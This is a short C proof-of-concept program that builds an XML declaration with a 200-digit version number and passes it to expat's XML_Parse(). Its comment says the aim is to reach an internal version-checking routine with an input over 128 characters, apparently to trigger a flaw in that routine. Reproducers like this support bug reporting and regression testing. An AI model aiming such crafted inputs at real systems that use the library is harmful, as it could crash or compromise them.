/* Proof of concept: reach checkXmlDeclVersionNum() through the public
 * XML_Parse() API with an XML declaration whose version pseudo-attribute
 * is a spec-conforming VersionNum of more than 128 characters.
 */
#include <expat.h>
#include <stdio.h>

int main(void) {
  char doc[512];
  int i;
  int len;
  XML_Parser parser;

  len = snprintf(doc, sizeof(doc), "<?xml version='1.");
  for (i = 0; i < 200; i++)
    doc[len++] = '0';
  len += snprintf(doc + len, sizeof(doc) - (size_t)len, "'?><doc/>");
  if (len < 0 || (size_t)len >= sizeof(doc))
    return 1;

  parser = XML_ParserCreate(NULL);
  if (parser == NULL)
    return 1;
  (void)XML_Parse(parser, doc, len, XML_TRUE);
  XML_ParserFree(parser);
  return 0;
}
